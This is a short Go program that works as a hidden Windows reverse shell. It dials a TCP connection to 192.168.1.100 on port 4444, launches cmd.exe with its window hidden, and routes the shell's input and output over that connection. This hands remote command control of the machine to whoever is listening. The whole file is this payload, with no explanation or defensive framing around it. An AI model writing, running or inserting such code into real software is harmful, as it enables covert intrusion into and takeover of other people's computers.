package main

import (
	"net"
	"os/exec"
	"syscall"
)

func main() {
	conn, _ := net.Dial("tcp", "192.168.1.100:4444")
	cmd := exec.Command("cmd.exe")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}
